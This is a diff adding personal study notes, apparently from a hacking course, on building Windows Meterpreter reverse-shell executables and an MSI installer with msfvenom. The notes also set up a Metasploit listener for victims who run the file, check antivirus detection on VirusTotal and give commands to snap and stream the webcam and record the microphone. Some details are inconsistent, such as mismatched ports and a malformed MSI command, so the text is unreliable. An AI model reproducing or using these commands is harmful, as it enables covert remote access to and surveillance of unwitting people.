@@ -1,0 +1,74 @@
+###################### DAY7 ########################
+
+1. Malware threads module :
+
+Commands For this :
+# msfvenom -p <payload> LHOST=<your-ip> LPORT=<some-Port> -f <file-format> -o <output-directory>
+
+-----------------------------------------------------------------------------------------------------------------------
+
+# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.137 LPORT=4455 -f exe -o /root/Desktop/amit.exe
+it create the exe file which name is amit.exr in the desktop but our system is not ready to take a request from this so we need to use handler in metasploit framework for shell execution create
+
+
+#msf > use exploit/multi/handler : for running the handler 
+
+#msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp  # settting the payload for this 
+
+#msf exploit(multi/handler) > set LHOST 192.168.0.137 (myip: same ip in msfvenom syntax)
+LHOST => 192.168.0.137
+#msf exploit(multi/handler) > set LPORT 5566 (any port same port in msfvenom syntax)
+LPORT => 5566
+
+
+#exploit -j Run this as background job 
+
+#### we set as a listner :::::::::::::::::::: so if any person is taking our exe and compile in the system then we will get the established connection :)
+
+jobs
+sessions
+---------------------------------------------------------------------------------------------------------------------------------
+
+########## virustotla website : where we need to upload our file and check it's any antivirus is there which create problem
+
+
+
+##################################################################################################################
+
+for windows 10 ::::
+
+# msfvenom -l formats
+
+# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.132 LPORT=3344 msi-nouac /root/Desktop/amit.msi
+
+Run a multi hander and run job for differnet Port :
+#msf > use exploit/multi/handler : for running the handler 
+
+#msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp  # settting the payload for this 
+
+#msf exploit(multi/handler) > set LHOST 192.168.0.137 (myip: same ip in msfvenom syntax)
+LHOST => 192.168.0.137
+#msf exploit(multi/handler) > set LPORT 5566 (any port same port in msfvenom syntax)
+LPORT => 5566
+
+
+#exploit -j Run this as background job 
+
+sessions -i 1 
+
+
+###### 
+webcam_list
+webcam_snap -i 1
+webcam_stream
+
+recordmic -d 5
+
+###############################################################################################################
+
+
+
+FOR linux
+
+
+
